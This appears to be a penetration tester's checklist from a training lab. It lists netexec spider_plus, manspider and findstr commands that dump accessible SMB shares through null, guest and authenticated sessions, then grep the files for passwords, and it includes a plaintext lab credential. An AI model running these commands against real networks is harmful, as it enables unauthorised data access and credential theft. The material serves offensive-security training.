- [ ] Dump All Accessibles Shares
- [ ] Analysis For Secrets

Dump All Accessibles Shares!!!
```sh
nxc smb $DC -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./output

nxc smb $DC -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./output
```
Analysis For Secrets!!!
```sh
tree
grep -iR passwd

docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.173 -t 256 -d INLANEFREIGHT.LOCAL -c 'passw' -u jbader -p 'ILovePower333###' --sharenames Finance Marketing Sales

nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' -M spider_plus -o DOWNLOAD_FLAG=True -o OUTPUT_FOLDER=./out -o "EXCLUDE_FILTER=['print$','ipc$', 'C$', 'ADMIN$', 'SYSVOL', 'NETLOGON', 'Company', 'HR', 'IT']" --smb-timeout 60

findstr /S /I /M /C:"passw" "C:\Finance\*"
findstr /S /I /M /C:"pass" "C:\Sales\*"
findstr /S /I /M /C:"passw" "C:\Marketing\*"
```
